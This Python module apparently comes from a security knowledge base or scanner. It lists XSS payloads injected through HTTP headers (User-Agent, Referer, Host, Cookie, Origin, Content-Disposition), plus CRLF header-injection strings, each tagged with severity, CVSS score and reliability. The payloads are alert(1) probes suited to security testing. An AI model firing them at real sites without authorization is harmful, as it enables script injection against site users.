#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

HTTP Header XSS Payloads
XSS via various HTTP headers
"""

from ..models import PayloadEntry


HTTP_HEADER_XSS_DATABASE = {
    # ===== USER-AGENT XSS =====
    "header_ua_001": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "user-agent"],
        severity="high",
        cvss_score=7.5,
        description="User-Agent XSS",
        reliability="high",
    ),
    "header_ua_002": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["header", "html_content"],
        tags=["header", "user-agent"],
        severity="high",
        cvss_score=7.5,
        description="User-Agent img XSS",
        reliability="high",
    ),
    # ===== REFERER XSS =====
    "header_referer_001": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "referer"],
        severity="high",
        cvss_score=7.5,
        description="Referer XSS",
        reliability="high",
    ),
    "header_referer_002": PayloadEntry(
        payload="javascript:alert(1)//",
        contexts=["header", "href"],
        tags=["header", "referer", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Referer javascript XSS",
        reliability="medium",
    ),
    # ===== X-FORWARDED-FOR XSS =====
    "header_xff_001": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["header", "html_content"],
        tags=["header", "x-forwarded-for"],
        severity="high",
        cvss_score=7.5,
        description="X-Forwarded-For XSS",
        reliability="high",
    ),
    # ===== X-FORWARDED-HOST XSS =====
    "header_xfh_001": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "x-forwarded-host"],
        severity="high",
        cvss_score=7.5,
        description="X-Forwarded-Host XSS",
        reliability="high",
    ),
    # ===== HOST HEADER XSS =====
    "header_host_001": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "host"],
        severity="high",
        cvss_score=7.5,
        description="Host header XSS",
        reliability="high",
    ),
    "header_host_002": PayloadEntry(
        payload='evil.com"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "host"],
        severity="high",
        cvss_score=7.5,
        description="Host with XSS payload",
        reliability="high",
    ),
    # ===== ACCEPT-LANGUAGE XSS =====
    "header_lang_001": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["header", "html_content"],
        tags=["header", "accept-language"],
        severity="high",
        cvss_score=7.5,
        description="Accept-Language XSS",
        reliability="medium",
    ),
    # ===== COOKIE XSS =====
    "header_cookie_001": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["header", "cookie"],
        tags=["header", "cookie"],
        severity="high",
        cvss_score=7.5,
        description="Cookie header XSS",
        reliability="high",
    ),
    # ===== ORIGIN XSS =====
    "header_origin_001": PayloadEntry(
        payload='https://"><script>alert(1)</script>',
        contexts=["header", "html_content"],
        tags=["header", "origin"],
        severity="high",
        cvss_score=7.5,
        description="Origin header XSS",
        reliability="medium",
    ),
    # ===== CONTENT-DISPOSITION XSS =====
    "header_cd_001": PayloadEntry(
        payload='attachment; filename="<script>alert(1)</script>.txt"',
        contexts=["header", "html_content"],
        tags=["header", "content-disposition"],
        severity="high",
        cvss_score=7.5,
        description="Content-Disposition filename XSS",
        reliability="high",
    ),
    # ===== X-REQUEST-ID XSS =====
    "header_xrid_001": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["header", "html_content"],
        tags=["header", "x-request-id"],
        severity="high",
        cvss_score=7.5,
        description="X-Request-ID XSS",
        reliability="medium",
    ),
    # ===== LINK HEADER XSS =====
    "header_link_001": PayloadEntry(
        payload='<javascript:alert(1)>; rel="preload"',
        contexts=["header", "href"],
        tags=["header", "link"],
        severity="high",
        cvss_score=7.5,
        description="Link header XSS",
        reliability="low",
    ),
    # ===== CRLF TO XSS =====
    "header_crlf_001": PayloadEntry(
        payload="%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
        contexts=["header", "html_content"],
        tags=["header", "crlf", "injection"],
        severity="critical",
        cvss_score=9.0,
        description="CRLF injection to XSS",
        reliability="medium",
    ),
    "header_crlf_002": PayloadEntry(
        payload="%0d%0aLocation:%20javascript:alert(1)",
        contexts=["header"],
        tags=["header", "crlf", "redirect"],
        severity="high",
        cvss_score=7.5,
        description="CRLF to redirect XSS",
        reliability="medium",
    ),
}

HTTP_HEADER_XSS_TOTAL = len(HTTP_HEADER_XSS_DATABASE)
